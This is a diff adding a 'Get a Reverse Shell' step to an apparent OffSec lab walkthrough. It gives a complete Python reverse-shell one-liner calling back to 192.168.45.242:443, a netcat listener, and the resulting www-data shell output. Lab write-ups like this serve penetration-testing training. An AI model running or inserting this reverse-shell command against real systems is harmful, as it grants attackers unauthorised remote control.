@@ -358,3 +358,17 @@ User www-data may run the following commands on cute:
 ```
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/2c1a1d4c-8afe-40c5-af8e-cd63d382b02e)
 
+Get a Reverse Shell
+```
+command > python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.242",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+```
+
+```
+> rlwrap nc -nlvvp 443
+listening on [any] 443 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.222.128] 37512
+$ whoami && id
+whoami && id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
